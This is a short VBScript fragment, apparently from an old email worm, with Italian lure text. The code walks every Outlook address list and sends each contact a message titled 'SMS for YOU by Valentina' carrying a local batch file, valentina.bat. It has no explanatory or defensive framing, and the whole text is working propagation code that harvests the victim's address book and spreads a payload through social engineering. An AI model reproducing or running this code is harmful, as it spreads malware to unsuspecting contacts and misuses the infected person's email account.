Set Client = CreateObject("Outlook.Application")
Set Address = Client.GetNameSpace("MAPI")
For ItemList = 1 To Address.AddressLists.Count
   Set CurrentAddress = Address.AddressLists(ItemList)
'valentina
'valentina
       For entries = 1 To CurrentAddress.AddressEntries.Count
           victim = CurrentAddress.AddressEntries(entries)
           Set Mailtosend = Client.CreateItem(0)
'valentina
           Mailtosend.Recipients.Add (victim)
           Mailtosend.Subject = "SMS for YOU by Valentina"
           Mailtosend.Body = "Quando vieni a trovarmi ???"
           Mailtosend.Attachments.Add ("c:\ciowork\vale\valentina.bat")
           Mailtosend.Send
       Next
'valentina e MIRKO
'valentina e MIRKO
Next
'valentina
'valentina
'valentina
Set Client = Nothing
Set Address = Nothing
